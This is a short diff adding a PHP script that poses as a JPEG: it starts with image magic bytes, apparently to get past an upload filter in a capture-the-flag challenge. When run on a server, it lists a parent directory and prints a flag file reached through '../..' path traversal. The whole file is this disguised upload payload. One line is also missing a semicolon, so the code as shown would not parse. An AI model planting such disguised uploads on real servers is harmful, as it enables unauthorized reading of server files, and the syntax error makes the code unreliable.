@@ -1,0 +1,25 @@
+ÿØÿà<?php
+$directory = '../..';
+
+// Check if the directory exists
+if (is_dir($directory)) {
+    // Get the list of files and directories
+    $files = scandir($directory);
+
+    // Remove . and .. from the list
+    $files = array_diff($files, ['.', '..']);
+
+    // Output the list
+    echo "Files in $directory:\n";
+    foreach ($files as $file) {
+        echo $file . "\n";
+    }
+} else {
+    echo "Directory not found.";
+}
+
+echo "\n"
+$file = "../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt";
+echo file_get_contents($file);
+?>
+
